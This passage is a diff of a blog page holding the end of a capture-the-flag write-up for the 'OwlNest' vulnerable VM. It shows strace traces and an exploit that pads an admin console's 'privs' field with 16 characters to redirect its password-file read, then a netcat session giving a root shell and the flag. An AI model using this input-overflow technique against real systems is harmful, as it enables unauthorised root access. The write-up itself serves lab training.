-write(1, &ldquo;This is the OwlNest Administrati&rdquo;&hellip;, 46This is the OwlNest Administration console</p>
-
-<p>) = 46
-write(1, &ldquo;Type Help for a list of availabl&rdquo;&hellip;, 47Type Help for a list of available commands.</p>
-
-<p>) = 47
-write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
-fstat64(0, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), &hellip;}) = 0
-mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7716000
-read(0, username root
-&ldquo;username root\n&rdquo;, 1024)        = 14
-write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
-read(0, privs /home/meh/password.txt
-&ldquo;privs /home/meh/password.txt\n&rdquo;, 1024) = 29
-write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
-read(0, password arse
-&ldquo;password arse\n&rdquo;, 1024)        = 14
-open(&ldquo;rd.txt&rdquo;, O_RDONLY)                = -1 ENOENT (No such file or directory)
-open(&ldquo;/root/password.txt&rdquo;, O_RDONLY)    = 3
-fstat64(3, {st_mode=S_IFREG|0644, st_size=5, &hellip;}) = 0
-mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7715000
-fstat64(3, {st_mode=S_IFREG|0644, st_size=5, &hellip;}) = 0
-<em>llseek(3, 0, [0], SEEK_SET)            = 0
-read(3, &ldquo;blah\n&rdquo;, 5)                    = 5
-</em>llseek(3, 5, [5], SEEK_SET)            = 0
-close(3)                                = 0
-munmap(0xb7715000, 4096)                = 0
-[/plain]</p>
 
 <p>As you can see here, it&rsquo;s cut off the first 16 characters of our priv input, and is trying to open &ldquo;rd.txt&rdquo;, which doesn&rsquo;t exist. Therefore we have to pad the privs input by 16 characters.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
-read(0, username root
-&ldquo;username root\n&rdquo;, 1024)        = 14
-write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
-read(0, privs AAAAAAAAAAAAAAAA/home/meh/password.txt
-&ldquo;privs AAAAAAAAAAAAAAAA/home/meh/&rdquo;&hellip;, 1024) = 45
-write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
-read(0, password bleh
-&ldquo;password bleh\n&rdquo;, 1024)        = 14
-open(&ldquo;/home/meh/password.txt&rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)
-open(&ldquo;/root/password.txt&rdquo;, O_RDONLY)    = 3
-fstat64(3, {st_mode=S_IFREG|0644, st_size=5, &hellip;}) = 0
-mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7715000
-fstat64(3, {st_mode=S_IFREG|0644, st_size=5, &hellip;}) = 0
-<em>llseek(3, 0, [0], SEEK_SET)            = 0
-read(3, &ldquo;cunt\n&rdquo;, 5)                    = 5
-</em>llseek(3, 5, [5], SEEK_SET)            = 0
-close(3)                                = 0
-munmap(0xb7715000, 4096)                = 0
-write(1, &ldquo;Ready: &rdquo;, 7Ready: )                  = 7
-read(0,
-[/plain]</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Ready: &quot;</span>, 7Ready: <span class="o">)</span>                  <span class="o">=</span> 7
+</span><span class='line'><span class="nb">read</span><span class="o">(</span>0, username root
+</span><span class='line'><span class="s2">&quot;username root\n&quot;</span>, 1024<span class="o">)</span>        <span class="o">=</span> 14
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Ready: &quot;</span>, 7Ready: <span class="o">)</span>                  <span class="o">=</span> 7
+</span><span class='line'><span class="nb">read</span><span class="o">(</span>0, privs AAAAAAAAAAAAAAAA/home/meh/password.txt
+</span><span class='line'><span class="s2">&quot;privs AAAAAAAAAAAAAAAA/home/meh/&quot;</span>..., 1024<span class="o">)</span> <span class="o">=</span> 45
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Ready: &quot;</span>, 7Ready: <span class="o">)</span>                  <span class="o">=</span> 7
+</span><span class='line'><span class="nb">read</span><span class="o">(</span>0, password bleh
+</span><span class='line'><span class="s2">&quot;password bleh\n&quot;</span>, 1024<span class="o">)</span>        <span class="o">=</span> 14
+</span><span class='line'>open<span class="o">(</span><span class="s2">&quot;/home/meh/password.txt&quot;</span>, O_RDONLY<span class="o">)</span> <span class="o">=</span> -1 ENOENT <span class="o">(</span>No such file or directory<span class="o">)</span>
+</span><span class='line'>open<span class="o">(</span><span class="s2">&quot;/root/password.txt&quot;</span>, O_RDONLY<span class="o">)</span>    <span class="o">=</span> 3
+</span><span class='line'>fstat64<span class="o">(</span>3, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span>0644, <span class="nv">st_size</span><span class="o">=</span>5, ...<span class="o">})</span> <span class="o">=</span> 0
+</span><span class='line'>mmap2<span class="o">(</span>NULL, 4096, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_ANONYMOUS, -1, 0<span class="o">)</span> <span class="o">=</span> 0xb7715000
+</span><span class='line'>fstat64<span class="o">(</span>3, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span>0644, <span class="nv">st_size</span><span class="o">=</span>5, ...<span class="o">})</span> <span class="o">=</span> 0
+</span><span class='line'>_llseek<span class="o">(</span>3, 0, <span class="o">[</span>0<span class="o">]</span>, SEEK_SET<span class="o">)</span>            <span class="o">=</span> 0
+</span><span class='line'><span class="nb">read</span><span class="o">(</span>3, <span class="s2">&quot;cunt\n&quot;</span>, 5<span class="o">)</span>                    <span class="o">=</span> 5
+</span><span class='line'>_llseek<span class="o">(</span>3, 5, <span class="o">[</span>5<span class="o">]</span>, SEEK_SET<span class="o">)</span>            <span class="o">=</span> 0
+</span><span class='line'>close<span class="o">(</span>3<span class="o">)</span>                                <span class="o">=</span> 0
+</span><span class='line'>munmap<span class="o">(</span>0xb7715000, 4096<span class="o">)</span>                <span class="o">=</span> 0
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Ready: &quot;</span>, 7Ready: <span class="o">)</span>                  <span class="o">=</span> 7
+</span><span class='line'><span class="nb">read</span><span class="o">(</span>0,
+</span></code></pre></td></tr></table></div></figure>
+
 
 <p>So, all we need to do now, is write a file to /home/rmp containing a password, and make the application read it instead of /root/password.txt.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# nc 172.16.56.140 31337
-        (_<strong>/)   (_</strong>/)   (_<strong>/)   (_</strong>/)   (_<strong>/)   (_</strong>/)
-        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
-        _<em>V__/   _</em>V<strong>/   __V</strong>/   _<em>V__/   _</em>V<strong>/   __V</strong>/
-       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
-       \:::::// \;;;;;// \:::::// \;;;;;// \;;;;;// \::::://
-   &mdash;&ndash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;<code>"" ""</code>&mdash;
-        _<em>V__/   _</em>V<strong>/   __V</strong>/   _<em>V__/   _</em>V<strong>/   __V</strong>/</p>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nc 172.16.56.140 31337
+</span><span class='line'>        <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>
+</span><span class='line'>        /0<span class="se">\ </span>/0<span class="se">\ </span>  /o<span class="se">\ </span>/o<span class="se">\ </span>  /0<span class="se">\ </span>/0<span class="se">\ </span>  /O<span class="se">\ </span>/O<span class="se">\ </span>  /o<span class="se">\ </span>/o<span class="se">\ </span>  /0<span class="se">\ </span>/0<span class="se">\</span>
+</span><span class='line'>        <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/
+</span><span class='line'>       /<span class="p">|</span>:. .:<span class="p">|</span><span class="se">\ </span>/<span class="p">|;</span>, ,<span class="p">;|</span><span class="se">\ </span>/<span class="p">|</span>:. .:<span class="p">|</span><span class="se">\ </span>/<span class="p">|;</span>, ,<span class="p">;|</span><span class="se">\ </span>/<span class="p">|;</span>, ,<span class="p">;|</span><span class="se">\ </span>/<span class="p">|</span>:. .:<span class="p">|</span><span class="se">\</span>
+</span><span class='line'>       <span class="se">\\</span>:::::// <span class="se">\\</span><span class="p">;;;;;</span>// <span class="se">\\</span>:::::// <span class="se">\\</span><span class="p">;;;;;</span>// <span class="se">\\</span><span class="p">;;;;;</span>// <span class="se">\\</span>::::://
+</span><span class='line'>   -----<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---
+</span><span class='line'>        <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/
+</span><span class='line'>
+</span><span class='line'>This is the OwlNest Administration console
+</span><span class='line'>
+</span><span class='line'>Type Help <span class="k">for</span> a list of available commands.
+</span><span class='line'>
+</span><span class='line'>Ready: username root
+</span><span class='line'>Ready: privs AAAAAAAAAAAAAAAA/home/rmp/password.txt
+</span><span class='line'>Ready: password password
+</span><span class='line'>Ready: login
+</span><span class='line'>Access Granted!
+</span><span class='line'>Dropping into /bin/sh
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span><span class='line'>cat /root/flag.txt
+</span><span class='line'>               <span class="se">\ </span><span class="sb">`</span>-._......_.-<span class="sb">`</span> /
+</span><span class='line'>                <span class="sb">`</span>.  <span class="s1">&#39;.    .&#39;</span>  .<span class="s1">&#39;     Oh Well, in the end you did it!</span>
+</span><span class='line'><span class="s1">                 //  _`\/`_  \\      You stopped the olws&#39;</span> evil plan
+</span><span class='line'>                <span class="o">||</span>  /<span class="se">\O</span><span class="o">||</span>O/<span class="se">\ </span> <span class="o">||</span>     By pwning their secret base you
+</span><span class='line'>                <span class="p">|</span><span class="se">\ </span> <span class="se">\_</span>/<span class="o">||</span><span class="se">\_</span>/  /<span class="p">|</span>     saved the world!
+</span><span class='line'>                <span class="se">\ </span><span class="s1">&#39;.   \/   .&#39;</span> /
+</span><span class='line'>                / ^ <span class="sb">`</span><span class="s1">&#39;~  ~&#39;</span><span class="sb">`</span>   <span class="se">\</span>
+</span><span class='line'>               /  _-^_~ -^_ ~-  <span class="p">|</span>
+</span><span class='line'>               <span class="p">|</span> / ^_ -^_- ~_^<span class="se">\ </span><span class="p">|</span>
+</span><span class='line'>               <span class="p">|</span> <span class="p">|</span>~_ ^- _-^_ -<span class="p">|</span> <span class="p">|</span>
+</span><span class='line'>               <span class="p">|</span> <span class="se">\ </span> ^-~_ ~-_^ / <span class="p">|</span>
+</span><span class='line'>               <span class="se">\_</span>/<span class="p">;</span>-.,____,.-<span class="p">;</span><span class="se">\_</span>/
+</span><span class='line'>        <span class="o">==========(</span>_<span class="o">(</span>_<span class="o">(==)</span>_<span class="o">)</span>_<span class="o">)=========</span>
+</span><span class='line'>
+</span><span class='line'>The flag is: ea2e548590260e12030c2460f82c1cff8965cff1971107a9ecb3565b08c274f4
+</span><span class='line'>
+</span><span class='line'>Hope you enjoyed this vulnerable VM.
+</span><span class='line'>Looking forward to see a writeup from you soon!
+</span><span class='line'>don<span class="s1">&#39;t forget to ping me on twitter with your thoughts</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">Sincerely</span>
+</span><span class='line'><span class="s1">@Swappage</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">PS: why the owls? oh well, I really don&#39;</span>t know and yes: i really suck at fictioning :p
+</span><span class='line'>True story is that i was looking <span class="k">for</span> some ASCII art to place in the puzzles and owls popped out first
+</span></code></pre></td></tr></table></div></figure>
 
-<p>This is the OwlNest Administration console</p>
-
-<p>Type Help for a list of available commands.</p>
-
-<p>Ready: username root
-Ready: privs AAAAAAAAAAAAAAAA/home/rmp/password.txt
-Ready: password password
-Ready: login
-Access Granted!
-Dropping into /bin/sh
-id
-uid=0(root) gid=0(root) groups=0(root)
-cat /root/flag.txt
-               \ <code>-._......_.-</code> /
-                <code>.  '.    .'  .'    Oh Well, in the end you did it!
-                 //  _</code>\/<code>_  \\     You stopped the olws' evil plan
-                ||  /\O||O/\  ||    By pwning their secret base you
-                |\  \_/||\_/  /|    saved the world!
-                \ '.   \/   .' /
-                / ^</code>&lsquo;~  ~&rsquo;`   \
-               /  <em>-^</em>~ -^<em> ~-  |
-               | / ^</em> -^<em>- ~</em>^\ |
-               | |~<em> ^- </em>-^<em> -| |
-               | \  ^-~</em> ~-<em>^ / |
-               _/;-.,</em><em><em><em>,.-;_/
-        ==========(</em>(</em>(==)</em>)_)=========</p>
-
-<p>The flag is: ea2e548590260e12030c2460f82c1cff8965cff1971107a9ecb3565b08c274f4</p>
-
-<p>Hope you enjoyed this vulnerable VM.
-Looking forward to see a writeup from you soon!
-don&rsquo;t forget to ping me on twitter with your thoughts</p>
-
-<p>Sincerely
-@Swappage</p>
-
-<p>PS: why the owls? oh well, I really don&rsquo;t know and yes: i really suck at fictioning :p
-True story is that i was looking for some ASCII art to place in the puzzles and owls popped out first
-[/plain]</p>
 
 <p><img src="http://media.tumblr.com/69d8d838b215ce8aeb5bcee2cac8c67a/tumblr_inline_n6f627Eb3o1rv1fhg.gif" alt="" /></p>
 </div>
